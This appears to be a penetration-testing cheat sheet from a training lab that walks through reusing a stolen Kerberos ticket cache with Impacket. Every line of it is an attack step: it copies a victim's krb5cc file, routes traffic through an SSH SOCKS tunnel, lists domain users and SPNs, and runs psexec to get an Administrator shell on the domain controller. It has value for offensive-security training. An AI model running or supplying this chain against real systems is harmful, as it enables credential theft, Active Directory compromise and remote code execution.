# Kerberos with Impacket

{% code overflow="wrap" %}
```bash
# Downloading the ccache file and setting the KRB5CCNAME environment variable
scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
export KRB5CCNAME=/tmp/krb5cc_minenow
# Installing Kerberos client utilities
sudo apt install krb5-user
# Getting the IP address of the domain controller
host corp1.com
# Comment out the line for proxy_dns in /etc/proxychains.conf
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#       
...
# Proxy DNS requests - no leak for DNS data
#proxy_dns 
...

# Setting up an SSH tunnel
ssh offsec@linuxvictim -D 9050
# Listing Active Directory users
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
# Gathering SPNs for our Kerberos user
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
# Getting a shell with psexec
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
```
{% endcode %}
